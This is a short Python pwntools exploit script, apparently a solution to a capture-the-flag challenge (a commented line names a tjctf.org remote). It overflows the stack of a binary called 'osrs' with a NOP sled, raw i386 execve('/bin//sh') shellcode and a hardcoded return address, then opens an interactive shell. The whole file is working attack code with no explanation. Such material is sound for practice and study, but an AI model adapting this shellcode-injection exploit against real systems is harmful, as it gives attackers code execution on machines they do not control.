#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

def pwn():

    io = process('./osrs')
    #io = remote('p1.tjctf.org', 8006)
    #addr = p32(0xffffcbc4)

    #shellcode = asm(shellcraft.sh())
    shellcode='\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
    print(len(shellcode))

    #print(len(shellcode))
    addr = p32(0xffffd500)

    # 272
    buf = '\x90' * 243 + shellcode + addr + '\x90' * 20 + shellcode

    print(io.recvuntil('Enter a tree type:'))
    io.sendline(buf + '\n')
    io.recv()
    io.interactive()

if __name__ == '__main__':
    pwn()
